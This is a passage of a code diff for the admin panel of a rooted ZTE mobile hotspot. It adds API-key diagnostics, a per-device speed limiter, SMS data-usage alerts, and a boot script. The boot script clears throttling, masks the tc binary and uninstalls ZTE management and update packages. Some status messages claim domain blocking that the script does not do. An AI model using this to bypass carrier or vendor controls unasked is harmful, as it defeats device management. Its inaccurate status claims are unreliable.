+                            lines.push('  已配置 API Key: ' + cfgKey.substring(0, 6) + '...' + cfgKey.substring(cfgKey.length - 4))
+                            lines.push('  服务商: ' + cfgProvider)
+                            lines.push('  正在验证...（约 15 秒）')
+                            var valRes = await _validateApiKey(_rs, cfgKey, cfgProvider)
+                            if (valRes.valid) {
+                                lines.push('  ✅ API Key 验证通过: ' + valRes.detail)
+                            } else {
+                                lines.push('  ❌ API Key 验证失败')
+                                lines.push('     错误: ' + valRes.error)
+                                lines.push('     详情: ' + valRes.detail.substring(0, 120))
+                            }
+                        } else {
+                            lines.push('  未检测到配置的 API Key')
+                        }
+                    } catch(e) {
+                        lines.push('  解析配置失败: ' + String(e))
+                    }
+
+                    // 显示诊断结果
+                    var report = lines.join('\n')
+                    _installLog(report)
+                    showToast('诊断完成，查看日志', 'green', 2000)
+                    console.log(report)
+                } finally {
+                    diagBtn.disabled = false
+                    diagBtn.textContent = origText
+                }
+            }
+        }
+
+        // 初始检测 PicoClaw 状态
+        checkPicoClawStatus()
+        
+        // 自动填充保存的 API Key
+        try {
+            var savedKey = localStorage.getItem('pc_saved_api_key')
+            var savedProvider = localStorage.getItem('pc_saved_provider')
+            if (savedKey) {
+                var installInput = document.getElementById('pc_api_key_input')
+                var configInput = document.getElementById('pc_config_api_input')
+                if (installInput) installInput.value = savedKey
+                if (configInput) configInput.value = savedKey
+            }
+            if (savedProvider) {
+                var installSelect = document.getElementById('pc_provider_select')
+                var configSelect = document.getElementById('pc_config_provider_select')
+                if (installSelect) installSelect.value = savedProvider
+                if (configSelect) configSelect.value = savedProvider
+            }
+        } catch(e) {}
+
+        // ============================================================
+        // ===== PicoClaw 聊天集成 结束 =====
+        // ============================================================
+
+        // 初始渲染
+        renderPendingCommands()
+        renderAILogs()
+        updateStats()
+        updateRunStatus()
+        updateFAB()
+
+        // 如果之前在运行，自动恢复
+        if (_aiRunning) {
+            setTimeout(function() {
+                aiLog('AI助手自动恢复运行', 'success')
+                startAI()
+            }, 2000)
+        }
+
+        addDiagLog('AI智能助手模块已加载', 'success')
+    })()
+    }, 600);
+
+    // ============ 去云控限速器 ============
+    ;(async () => {
+        const ZTE_SH_DIR = "/data/fuck_zte_net_limit"
+        const ZTE_SH_FILE = "/data/fuck_zte_net_limit/fuck_zte.sh"
+        const ZTE_BOOT_SH_FILE = "/sdcard/ufi_tools_boot.sh"
+        const ZTE_SCRIPT = `#!/system/bin/sh
+settings put global sim_network_limit 1:0
+settings put global restrict_device_data_connect 0
+umount /system/bin/tc 2>/dev/null
+disable_tc() {
+    tc qdisc del dev sipa_eth0 root 2>/dev/null
+    tc qdisc del dev sipa_eth8 root 2>/dev/null
+    for dev in $(ls /sys/class/net); do
+        case "$dev" in
+            lo)
+                continue
+                ;;
+        esac
+        tc qdisc del dev $dev root 2>/dev/null
+        tc qdisc del dev $dev ingress 2>/dev/null
+    done
+}
+if [ -d /data/fuck_zte_net_limit ]; then
+    rm -f /data/fuck_zte_net_limit/tc
+fi
+disable_tc &
+disable_tc &
+touch /data/fuck_zte_net_limit/tc
+mount --bind /data/fuck_zte_net_limit/tc /system/bin/tc
+pm disable com.zte.zdm
+pm uninstall -k --user 0 com.zte.zdm
+pm uninstall -k --user 0 cn.zte.aftersale
+pm uninstall -k --user 0 com.zte.zdmdaemon
+pm uninstall -k --user 0 com.zte.zdmdaemon.install
+pm uninstall -k --user 0 com.zte.analytics
+pm uninstall -k --user 0 com.zte.neopush
+settings put global sim_network_limit 1:0
+settings put global restrict_device_data_connect 0
+sync
+`
+
+        const zteCheckRoot = async () => {
+            try {
+                const res = await runShellWithRoot('whoami')
+                return res.success && res.content.includes('root')
+            } catch { return false }
+        }
+
+        const zteCheckInstalled = async () => {
+            try {
+                const res = await runShellWithRoot("grep -q 'fuck_zte.sh' /sdcard/ufi_tools_boot.sh 2>/dev/null; echo $?")
+                return res.content.trim() === '0'
+            } catch { return false }
+        }
+
+        const zteUploadFile = async (filename, content, destPath) => {
+            try {
+                const file = new File([content], filename, { type: "text/plain" })
+                const formData = new FormData()
+                formData.append("file", file)
+                const uploadRes = await (await fetch(`${KANO_baseURL}/upload_img`, {
+                    method: "POST",
+                    headers: common_headers,
+                    body: formData,
+                })).json()
+                if (uploadRes.url) {
+                    const tempPath = `/data/data/com.minikano.f50_sms/files${uploadRes.url}`
+                    const moveRes = await runShellWithRoot(`mv ${tempPath} ${destPath}`)
+                    return moveRes.success
+                }
+                return false
+            } catch { return false }
+        }
+
+        const zteUninstall = async () => {
+            if (!(await zteCheckRoot())) {
+                createToast("没有开启高级功能，无法使用！", "red")
+                return false
+            }
+            createToast("卸载中...")
+            await runShellWithRoot("sed -i '/fuck_zte/d' /sdcard/ufi_tools_boot.sh 2>/dev/null")
+            await runShellWithRoot("umount /system/etc/hosts 2>/dev/null; umount /system/bin/tc 2>/dev/null")
+            await runShellWithRoot(`rm -rf ${ZTE_SH_FILE}`)
+            await runShellWithRoot(`rm -rf ${ZTE_SH_DIR}`)
+            createToast("已移除去云控,重启后生效")
+            return true
+        }
+
+        const zteInstall = async () => {
+            if (!(await zteCheckRoot())) {
+                return createToast("没有开启高级功能，无法使用！", "red")
+            }
+            if (await zteCheckInstalled()) {
+                return createToast("你已经安装了！", "red")
+            }
+            if (!(await runShellWithRoot(`mkdir -p ${ZTE_SH_DIR}`)).success) {
+                return createToast("创建文件夹失败！", "red")
+            }
+            if (!await zteUploadFile("fuck_zte.sh", ZTE_SCRIPT, ZTE_SH_FILE)) {
+                return createToast("传输文件失败！", "red")
+            }
+            await runShellWithRoot(`grep -qxF 'sh ${ZTE_SH_FILE} &' /sdcard/ufi_tools_boot.sh 2>/dev/null || echo 'sh ${ZTE_SH_FILE} &' >> /sdcard/ufi_tools_boot.sh 2>/dev/null`)
+            await runShellWithRoot(`sh ${ZTE_SH_FILE} &`)
+            createToast("已屏蔽云控域名！")
+            createToast("已禁止OTA更新！")
+            createToast("已去除所有限速！")
+            createToast("已设置开机自启！")
+        }
+
+        const zteBtn = document.createElement('button')
+        zteBtn.textContent = '🚀 启用去云控'
+        zteBtn.className = 'smart_action_btn'
+        zteBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#ef4444,#dc2626);color:white;border:1px solid rgba(252,165,165,.4);'
+        zteBtn.onclick = async () => { await zteInstall() }
+        actionBox.appendChild(zteBtn)
+
+        const zteBtn2 = document.createElement('button')
+        zteBtn2.textContent = '❌ 移除去云控'
+        zteBtn2.className = 'smart_action_btn'
+        zteBtn2.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#6b7280,#4b5563);color:white;border:1px solid rgba(156,163,175,.4);'
+        zteBtn2.onclick = async () => { await zteUninstall() }
+        actionBox.appendChild(zteBtn2)
+
+        addDiagLog('去云控限速器模块已加载', 'success')
+    })()
+
+    // ============ 限速器高级版 ============
+    ;(async () => {
+        // 获取热点连接的所有设备（返回 {name, ip, mac} 列表）
+        var _scanHotspotDevices = async function() {
+            var devices = []
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return devices
+
+            // 读取自定义设备名文件
+            var nameMap = {}
+            try {
+                var nameRes = await _rs("timeout 2s awk '{print}' /data/hotspot_traffic/custom_names.txt 2>/dev/null || echo ''")
+                var nameLines = (nameRes && nameRes.content || '').split('\n')
+                for (var i = 0; i < nameLines.length; i++) {
+                    var line = nameLines[i]
+                    var idx = line.indexOf('|')
+                    if (idx > 0) nameMap[line.slice(0, idx).toUpperCase()] = line.slice(idx + 1).trim()
+                }
+            } catch(e) {}
+
+            // 从热点流量监控读取设备
+            try {
+                var htRes = await _rs("timeout 2s awk '{print}' /data/hotspot_traffic/data.json 2>/dev/null || echo ''")
+                var htText = (htRes && htRes.content || '').trim()
+                if (htText && htText.indexOf('{') === 0) {
+                    var htData = JSON.parse(htText)
+                    if (htData && htData.devices) {
+                        for (var macKey in htData.devices) {
+                            var dev = htData.devices[macKey]
+                            if (!dev || !dev.mac) continue
+                            var devName = nameMap[dev.mac.toUpperCase()] || dev.hostname || dev.name || ''
+                            if (!devName) devName = '设备-' + (dev.mac || '').slice(-5).toUpperCase()
+                            devices.push({ name: devName, ip: dev.ip || '', mac: dev.mac, online: dev.online !== false })
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 从 ARP 补充
+            try {
+                var arpRes = await _rs("timeout 2s cat /proc/net/arp 2>/dev/null | grep -v '00:00:00:00:00:00' | grep -v 'IP '")
+                var arpLines = (arpRes && arpRes.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                for (var ai = 0; ai < arpLines.length; ai++) {
+                    var parts = arpLines[ai].trim().split(/\s+/)
+                    if (parts.length >= 4) {
+                        var ip = parts[0]
+                        var mac = parts[3]
+                        if (mac && mac !== '00:00:00:00:00:00' && mac !== '*') {
+                            var exists = devices.some(function(d) { return d.mac.toUpperCase() === mac.toUpperCase() })
+                            if (!exists) {
+                                var arpName = nameMap[mac.toUpperCase()] || ''
+                                if (!arpName) arpName = '设备-' + mac.slice(-5).toUpperCase()
+                                devices.push({ name: arpName, ip: ip, mac: mac, online: true })
+                            } else {
+                                var existing = devices.find(function(d) { return d.mac.toUpperCase() === mac.toUpperCase() })
+                                if (existing && !existing.ip) existing.ip = ip
+                            }
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 从 DHCP leases 补充设备名
+            try {
+                var dhcpRes = await _rs("timeout 2s cat /data/misc/dhcp/dnsmasq.leases 2>/dev/null || echo ''")
+                var dhcpLines = (dhcpRes && dhcpRes.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                for (var di = 0; di < devices.length; di++) {
+                    var dd = devices[di]
+                    if (!dd.name || dd.name.indexOf('设备-') === 0) {
+                        for (var dj = 0; dj < dhcpLines.length; dj++) {
+                            var dparts = dhcpLines[dj].trim().split(/\s+/)
+                            if (dparts.length >= 2 && dparts[1].toUpperCase() === dd.mac.toUpperCase()) {
+                                var dhcpName = dparts[3] || dparts[2] || ''
+                                if (dhcpName && dhcpName !== '*') dd.name = dhcpName
+                            }
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 从 ip neigh 补充
+            try {
+                var neighRes = await _rs("timeout 2s ip neigh 2>/dev/null | grep -v 'INCOMPLETE' || echo ''")
+                var neighLines = (neighRes && neighRes.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                for (var ni = 0; ni < neighLines.length; ni++) {
+                    var lineStr = neighLines[ni]
+                    var macMatch = lineStr.match(/([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})/)
+                    var ipMatch = lineStr.match(/^(\d+\.\d+\.\d+\.\d+)/)
+                    if (macMatch && ipMatch) {
+                        var nmac = macMatch[1]
+                        var nip = ipMatch[1]
+                        if (nmac !== '00:00:00:00:00:00') {
+                            var nexists = devices.some(function(d) { return d.mac.toUpperCase() === nmac.toUpperCase() })
+                            if (!nexists) {
+                                var nName = nameMap[nmac.toUpperCase()] || ('设备-' + nmac.slice(-5).toUpperCase())
+                                devices.push({ name: nName, ip: nip, mac: nmac, online: true })
+                            } else {
+                                var nexisting = devices.find(function(d) { return d.mac.toUpperCase() === nmac.toUpperCase() })
+                                if (nexisting && !nexisting.ip) nexisting.ip = nip
+                            }
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 过滤掉没有IP的设备
+            devices = devices.filter(function(d) { return d.ip && d.ip.indexOf('127.') !== 0 })
+
+            return devices
+        }
+
+        // 获取当前限速状态
+        var _getLimitStatus = async function() {
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return {}
+            try {
+                var res = await _rs("tc qdisc show dev wlan0 2>/dev/null; tc class show dev wlan0 2>/dev/null; tc filter show dev wlan0 2>/dev/null")
+                return { output: (res && res.content || '') }
+            } catch(e) { return {} }
+        }
+
+        // 应用限速到指定IP
+        var _applyLimit = async function(ip, speedKbps) {
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return false
+            try {
+                // 检查tc是否可用（去云控限速器可能挂载了假的tc）
+                var tcCheck = await _rs("which tc 2>/dev/null && tc qdisc show dev wlan0 2>&1 | head -1")
+                var tcOut = (tcCheck && tcCheck.content || '').trim()
+                // 如果tc输出为空或报错，可能被去云控限速器屏蔽了
+                if (!tcOut || tcOut.indexOf('not found') >= 0 || tcOut.indexOf('Permission') >= 0) {
+                    // 尝试卸载假tc
+                    await _rs("umount /system/bin/tc 2>/dev/null")
+                }
+
+                // 使用IP最后一段作为class ID
+                var classId = ip.split('.')[3]
+                var cid = parseInt(classId) || 100
+                if (cid > 999) cid = cid % 1000
+                if (cid < 10) cid += 100
+
+                if (speedKbps > 0) {
+                    // 确保root qdisc存在（不删除已有的）
+                    var qdiscCheck = await _rs("tc qdisc show dev wlan0 2>/dev/null | grep htb")
+                    if (!qdiscCheck || !qdiscCheck.content || !qdiscCheck.content.trim()) {
+                        await _rs("tc qdisc add dev wlan0 root handle 1: htb 2>/dev/null")
+                    }
+                    // 添加class
+                    var cmd = "tc class replace dev wlan0 parent 1: classid 1:" + cid + " htb rate " + speedKbps + "kbit ceil " + speedKbps + "kbit 2>/dev/null"
+                    await _rs(cmd)
+                    // 添加filter (按目标IP匹配)
+                    var filterCmd = "tc filter replace dev wlan0 protocol ip parent 1: prio " + cid + " u32 match ip dst " + ip + " flowid 1:" + cid + " 2>/dev/null"
+                    await _rs(filterCmd)
+                } else {
+                    // 移除限速
+                    await _rs("tc class del dev wlan0 parent 1: classid 1:" + cid + " 2>/dev/null")
+                    await _rs("tc filter del dev wlan0 protocol ip parent 1: prio " + cid + " 2>/dev/null")
+                }
+                return true
+            } catch(e) { return false }
+        }
+
+        // 移除所有限速
+        var _removeAllLimits = async function() {
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return false
+            try {
+                await _rs("tc qdisc del dev wlan0 root 2>/dev/null")
+                return true
+            } catch(e) { return false }
+        }
+
+        // 显示限速器弹窗
+        var _showLimitModal = async function() {
+            if (!(await checkAdvanceFunc())) return createToast('没有开启高级功能，无法使用！', 'red')
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return createToast('无Root权限', 'red')
+
+            createToast('正在获取设备列表...', 'pink', 2000)
+            var devices = await _scanHotspotDevices()
+            if (!devices.length) return createToast('未检测到连接设备', 'red')
+
+            // 读取当前限速配置
+            var limitConfig = {}
+            try {
+                var cfgRes = await _rs("timeout 2s awk '{print}' /data/hotspot_traffic/limit_config.json 2>/dev/null || echo ''")
+                var cfgText = (cfgRes && cfgRes.content || '').trim()
+                if (cfgText && cfgText.indexOf('{') === 0) limitConfig = JSON.parse(cfgText)
+            } catch(e) {}
+
+            var _esc = function(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') }
+
+            // 构建设备列表HTML
+            var deviceListHtml = ''
+            for (var i = 0; i < devices.length; i++) {
+                var d = devices[i]
+                var curSpeed = (limitConfig[d.ip] && limitConfig[d.ip].speed) || 0
+                var dot = d.online ? '🟢' : '⚫'
+                var name = _esc(d.name)
+                // 隐藏IP，只显示设备名
+                deviceListHtml += '<div class="slimit-device-row" data-ip="' + _esc(d.ip) + '" data-mac="' + _esc(d.mac) + '" style="display:flex;align-items:center;gap:8px;padding:8px;border-bottom:1px solid rgba(255,255,255,.06);">'
+                deviceListHtml += '<span style="font-size:.7rem;">' + dot + '</span>'
+                deviceListHtml += '<span style="flex:1;font-size:.72rem;color:#e2e8f0;font-weight:600;">' + name + '</span>'
+                deviceListHtml += '<select class="slimit-speed-select" style="background:#1e2030;border:1px solid #334155;border-radius:5px;color:#e2e8f0;font-size:.65rem;padding:4px 8px;outline:none;">'
+                var speeds = [
+                    {v: 0, t: '不限速'},
+                    {v: 256, t: '256KB/s'},
+                    {v: 512, t: '512KB/s'},
+                    {v: 1024, t: '1MB/s'},
+                    {v: 2048, t: '2MB/s'},
+                    {v: 5120, t: '5MB/s'},
+                ]
+                for (var s = 0; s < speeds.length; s++) {
+                    deviceListHtml += '<option value="' + speeds[s].v + '"' + (curSpeed === speeds[s].v ? ' selected' : '') + '>' + speeds[s].t + '</option>'
+                }
+                deviceListHtml += '</select>'
+                deviceListHtml += '</div>'
+            }
+
+            var html = '<div style="margin-bottom:10px;">'
+                html += '<div style="font-size:.65rem;color:#94a3b8;margin-bottom:8px;">已检测到 <b style="color:#a78bfa">' + devices.length + '</b> 台设备连接，选择限速速度后点击应用</div>'
+                html += '</div>'
+                html += '<div id="slimit_device_list" style="max-height:300px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,.2);">' + deviceListHtml + '</div>'
+                html += '<div style="display:flex;gap:8px;margin-top:12px;">'
+                html += '<button id="slimit_apply" style="flex:2;padding:8px;font-size:.65rem;border:none;border-radius:8px;background:linear-gradient(135deg,#f59e0b,#d97706);color:white;cursor:pointer;font-weight:600;">✅ 应用限速</button>'
+                html += '<button id="slimit_remove_all" style="flex:1;padding:8px;font-size:.65rem;border:1px solid #334155;border-radius:8px;background:transparent;color:#94a3b8;cursor:pointer;">清除所有限速</button>'
+                html += '</div>'
+
+            // 创建弹窗
+            var overlay = document.createElement('div')
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:99999;display:flex;align-items:center;justify-content:center;'
+            overlay.id = 'slimit_overlay'
+
+            var modal = document.createElement('div')
+            modal.style.cssText = 'background:#15171f;border:1px solid #334155;border-radius:16px;padding:20px;width:90%;max-width:420px;max-height:80vh;overflow-y:auto;'
+            modal.innerHTML = '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">'
+                + '<div style="font-size:.82rem;font-weight:700;color:#fbbf24;">🚦 限速器高级版</div>'
+                + '<span id="slimit_close" style="color:#64748b;cursor:pointer;font-size:1rem;">✕</span>'
+                + '</div>' + html
+
+            overlay.appendChild(modal)
+            document.body.appendChild(overlay)
+
+            // 关闭
+            modal.querySelector('#slimit_close').onclick = function() { document.body.removeChild(overlay) }
+            overlay.onclick = function(e) { if (e.target === overlay) document.body.removeChild(overlay) }
+
+            // 应用限速
+            modal.querySelector('#slimit_apply').onclick = async function() {
+                var rows = modal.querySelectorAll('.slimit-device-row')
+                var newConfig = {}
+                var applyCount = 0
+                var removeCount = 0
+
+                var btn = this
+                btn.textContent = '⏳ 正在应用...'
+                btn.disabled = true
+
+                for (var r = 0; r < rows.length; r++) {
+                    var row = rows[r]
+                    var ip = row.getAttribute('data-ip')
+                    var sel = row.querySelector('.slimit-speed-select')
+                    var speed = parseInt(sel.value) || 0
+
+                    if (speed > 0) {
+                        newConfig[ip] = { speed: speed }
+                        var ok = await _applyLimit(ip, speed)
+                        if (ok) applyCount++
+                    } else {
+                        var ok2 = await _applyLimit(ip, 0)
+                        if (ok2) removeCount++
+                    }
+                }
+
+                // 保存配置
+                try { await _rs("echo '" + JSON.stringify(newConfig) + "' > /data/hotspot_traffic/limit_config.json 2>/dev/null") } catch(e) {}
+
+                btn.textContent = '✅ 已应用'
+                btn.style.background = 'linear-gradient(135deg,#10b981,#059669)'
+                createToast('限速已应用：' + applyCount + '台限速, ' + removeCount + '台解除', 'green', 3000)
+                setTimeout(function() {
+                    if (document.getElementById('slimit_overlay')) document.body.removeChild(overlay)
+                }, 1500)
+            }
+
+            // 清除所有限速
+            modal.querySelector('#slimit_remove_all').onclick = async function() {
+                var ok = await _removeAllLimits()
+                if (ok) {
+                    // 清空配置文件
+                    try { await _rs("echo '{}' > /data/hotspot_traffic/limit_config.json 2>/dev/null") } catch(e) {}
+                    // 重置所有下拉框
+                    var sels = modal.querySelectorAll('.slimit-speed-select')
+                    sels.forEach(function(s) { s.value = '0' })
+                    createToast('所有限速已清除', 'green', 2000)
+                } else {
+                    createToast('清除失败', 'red', 2000)
+                }
+            }
+
+            addDiagLog('限速器高级版已打开，检测到 ' + devices.length + ' 台设备', 'success')
+        }
+
+        // 添加按钮
+        var limitBtn = document.createElement('button')
+        limitBtn.textContent = '⚡ 限速器'
+        limitBtn.className = 'smart_action_btn'
+        limitBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#f59e0b,#d97706);color:white;border:1px solid rgba(251,191,36,.4);'
+        limitBtn.onclick = async function() { await _showLimitModal() }
+        actionBox.appendChild(limitBtn)
+
+        addDiagLog('限速器高级版模块已加载', 'success')
+    })()
+
+    // ============ 流量监控 · 套餐告警（自动发短信提醒） ============
+    // 【性能优化】延迟500ms加载
+    setTimeout(function() {
+    ;(async () => {
+        const TRAFFIC_DATA_DIR = '/data/traffic_monitor'
+        const TRAFFIC_DATA_FILE = TRAFFIC_DATA_DIR + '/data.json'
+        const TRAFFIC_CONFIG_FILE = TRAFFIC_DATA_DIR + '/config.json'
+        const TRAFFIC_LS_PREFIX = 'traffic_monitor_'
+
+        // ---- 默认配置 ----
+        var _tcfg = {
+            enabled: true,
+            carrier: 'auto',       // auto / mobile / unicom / telecom
+            planTotal: 30,          // 套餐总量（GB）
+            warnThreshold: 5,       // 剩余流量告警阈值（GB）
+            warnPhone: '',          // 告警短信接收手机号
+            warnMessage: '【流量告警】您的剩余流量已不足{left}GB，本月已用{used}GB，套餐共{total}GB，请及时关注流量使用情况。',
+            cycleDay: 1,            // 每月几号重置（账单日）
+            autoWarn: true,         // 是否自动告警
+            lastWarnMonth: '',      // 上次告警月份，防止重复告警
+            notifySelf: true        // 也给本设备卡发短信
+        }
+
+        // ---- 从 localStorage 恢复配置 ----
+        try {
+            var savedCfg = localStorage.getItem(TRAFFIC_LS_PREFIX + 'config')
+            if (savedCfg) {
+                var parsed = JSON.parse(savedCfg)
+                for (var k in parsed) { if (parsed[k] !== undefined) _tcfg[k] = parsed[k] }
+            }
+        } catch(e) {}
+
+        // ---- 流量数据 ----
+        var _tdata = {
+            monthStart: '',         // 本月开始日期 YYYY-MM-DD
+            monthUsedTx: 0,        // 本月已用上传（字节）
+            monthUsedRx: 0,        // 本月已用下载（字节）
+            monthUsedTotal: 0,     // 本月已用总量（字节）
+            todayUsed: 0,          // 今日已用（字节）
+            todayDate: '',         // 今日日期
+            lastCheckTime: 0,
+            lastTxBytes: 0,        // 上次检查时的接口总TX
+            lastRxBytes: 0         // 上次检查时的接口总RX
+        }
+
+        try {
+            var savedData = localStorage.getItem(TRAFFIC_LS_PREFIX + 'data')
+            if (savedData) {
+                var pd = JSON.parse(savedData)
+                for (var k in pd) { if (pd[k] !== undefined) _tdata[k] = pd[k] }
+            }
+        } catch(e) {}
+
+        // ---- 保存函数 ----
+        var _saveTCfg = function() {
+            try { localStorage.setItem(TRAFFIC_LS_PREFIX + 'config', JSON.stringify(_tcfg)) } catch(e) {}
+        }
+        var _saveTData = function() {
+            try { localStorage.setItem(TRAFFIC_LS_PREFIX + 'data', JSON.stringify(_tdata)) } catch(e) {}
+        }
+
+        // ---- 工具函数 ----
+        var _t_rs = function(cmd, t) {
+            return new Promise(function(resolve) {
+                try {
+                    runShellWithRoot(cmd, t || 3000).then(function(r) {
+                        resolve(r || { content: '', success: false })
+                    }).catch(function() { resolve({ content: '', success: false }) })
+                } catch(e) { resolve({ content: '', success: false }) }
+            })
+        }
+
+        var _fmtGB = function(bytes) {
+            var gb = bytes / (1024 * 1024 * 1024)
+            if (gb >= 1) return gb.toFixed(2) + 'GB'
+            var mb = bytes / (1024 * 1024)
+            if (mb >= 1) return mb.toFixed(1) + 'MB'
+            return (bytes / 1024).toFixed(0) + 'KB'
+        }
+
+        var _getTodayStr = function() {
+            var d = new Date()
+            return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0')
+        }
+
+        var _getMonthStart = function() {
+            var d = new Date()
+            var day = d.getDate()
+            var cycleDay = _tcfg.cycleDay || 1
+            if (day < cycleDay) {
+                // 上个月的账单日到这个月的账单日前
+                var lastMonth = new Date(d.getFullYear(), d.getMonth() - 1, cycleDay)
+                return lastMonth.getFullYear() + '-' + String(lastMonth.getMonth()+1).padStart(2,'0') + '-' + String(cycleDay).padStart(2,'0')
+            } else {
+                return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(cycleDay).padStart(2,'0')
+            }
+        }
+
+        var _getCurrentMonthKey = function() {
+            var d = new Date()
+            var day = d.getDate()
+            var cycleDay = _tcfg.cycleDay || 1
+            if (day < cycleDay) {
+                var m = d.getMonth()
+                var y = d.getFullYear()
+                if (m === 0) { m = 11; y-- } else { m-- }
+                return y + '-' + String(m+1).padStart(2,'0')
+            }
+            return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0')
+        }
+
+        // ---- 读取网络接口流量 ----
+        var _readNetTraffic = async function() {
+            // 尝试多个可能的上网接口
+            var ifaces = ['rmnet_data0', 'rmnet0', 'eth0', 'sipa_eth0', 'wlan0']
+            var result = { tx: 0, rx: 0, iface: '' }
+
+            for (var i = 0; i < ifaces.length; i++) {
+                var iface = ifaces[i]
+                var txRes = await _t_rs("awk '{print $1}' /sys/class/net/" + iface + "/statistics/tx_bytes 2>/dev/null", 1000)
+                var rxRes = await _t_rs("awk '{print $1}' /sys/class/net/" + iface + "/statistics/rx_bytes 2>/dev/null", 1000)
+                var tx = parseInt((txRes.content || '').trim()) || 0
+                var rx = parseInt((rxRes.content || '').trim()) || 0
+                if (tx > 1024 || rx > 1024) {
+                    result.tx = tx
+                    result.rx = rx
+                    result.iface = iface
+                    break
+                }
+            }
+
+            // 如果上面都没找到，用 /proc/net/dev 兜底
+            if (result.tx === 0 && result.rx === 0) {
+                var devRes = await _t_rs("cat /proc/net/dev 2>/dev/null | grep -E 'rmnet|eth|sipa' | head -3", 1000)
+                var lines = (devRes.content || '').trim().split('\n')
+                for (var li = 0; li < lines.length; li++) {
+                    var parts = lines[li].trim().split(/\s+/)
+                    if (parts.length >= 10) {
+                        var rx2 = parseInt(parts[1]) || 0
+                        var tx2 = parseInt(parts[9]) || 0
+                        if (tx2 > result.tx || rx2 > result.rx) {
+                            result.tx = tx2
+                            result.rx = rx2
+                            result.iface = parts[0].replace(':', '')
+                        }
+                    }
+                }
+            }
+
+            return result
+        }
+
+        // ---- 检查并更新流量统计 ----
+        var _updateTraffic = async function() {
+            var today = _getTodayStr()
+            var monthStart = _getMonthStart()
+            var monthKey = _getCurrentMonthKey()
+
+            // 检测月份变化，重置
+            if (_tdata.monthStart !== monthStart) {
+                _tdata.monthStart = monthStart
+                _tdata.monthUsedTx = 0
+                _tdata.monthUsedRx = 0
+                _tdata.monthUsedTotal = 0
+                _tdata.lastWarnMonth = ''
+                _tcfg.lastWarnMonth = ''
+                _saveTCfg()
+            }
+
+            // 检测日期变化，重置今日
+            if (_tdata.todayDate !== today) {
+                _tdata.todayDate = today
+                _tdata.todayUsed = 0
+            }
+
+            var netData = await _readNetTraffic()
+            var now = Date.now()
+
+            if (_tdata.lastCheckTime > 0 && _tdata.lastTxBytes > 0 && netData.tx > 0) {
+                // 计算增量
+                var txDelta = Math.max(0, netData.tx - _tdata.lastTxBytes)
+                var rxDelta = Math.max(0, netData.rx - _tdata.lastRxBytes)
+
+                // 异常检测：如果差值太大（比如重启后计数器归零再涨上来），跳过
+                if (txDelta < 1024 * 1024 * 1024 * 50 && rxDelta < 1024 * 1024 * 1024 * 50) {
+                    var totalDelta = txDelta + rxDelta
+                    _tdata.monthUsedTx += txDelta
+                    _tdata.monthUsedRx += rxDelta
+                    _tdata.monthUsedTotal += totalDelta
+                    _tdata.todayUsed += totalDelta
+                }
+            }
+
+            _tdata.lastTxBytes = netData.tx
+            _tdata.lastRxBytes = netData.rx
+            _tdata.lastCheckTime = now
+
+            _saveTData()
+
+            // 检查是否需要告警
+            if (_tcfg.autoWarn && _tcfg.warnPhone && _tcfg.warnThreshold > 0) {
+                var remaining = _tcfg.planTotal * 1024 * 1024 * 1024 - _tdata.monthUsedTotal
+                var thresholdBytes = _tcfg.warnThreshold * 1024 * 1024 * 1024
+                if (remaining <= thresholdBytes && remaining > 0 && _tcfg.lastWarnMonth !== monthKey) {
+                    _tcfg.lastWarnMonth = monthKey
+                    _saveTCfg()
+                    _sendWarnSms()
+                }
+            }
+
+            return netData
+        }
+
+        // ---- 发送短信（多链路兜底：AT接口两步交互 → 一次性序列 → 串口直写）----
+        var _sendSms = async function(phone, content) {
+            if (!phone || !content) return { success: false, msg: '手机号或内容为空' }
+            phone = phone.trim()
+            var diag = []
+
+            // ===== 链路1a：AT 接口两步交互（AT+CMGS → modem 回 > → 正文+Ctrl+Z）=====
+            // modem 的 AT 状态在物理串口上保持，两个独立请求间不丢失
+            try {
+                await _readAtCmd(_urlE('AT+CMGF=1'))
+                var r1 = await _readAtCmd(_urlE('AT+CMGS="' + phone + '"'))
+                diag.push('指令响应:' + r1.replace(/\n/g, ' ').substring(0, 25))
+                if (r1.indexOf('>') >= 0) {
+                    // Ctrl+Z = 0x1A → URL 编码 %1A
+                    var r2 = await _readAtCmd(_urlE(content) + '%1A')
+                    diag.push('正文响应:' + r2.replace(/\n/g, ' ').substring(0, 25))
+                    if (r2.indexOf('+CMGS') >= 0 || r2.indexOf('OK') >= 0) {
+                        addDiagLog('短信已发送(AT两步交互)', 'success')
+                        return { success: true, msg: '发送成功' }
+                    }
+                }
+            } catch(e) { diag.push('两步异常:' + (e.message || e)) }
+
+            // ===== 链路1b：一次性完整序列（若代理会 URL 解码整个 command 则有效）=====
+            try {
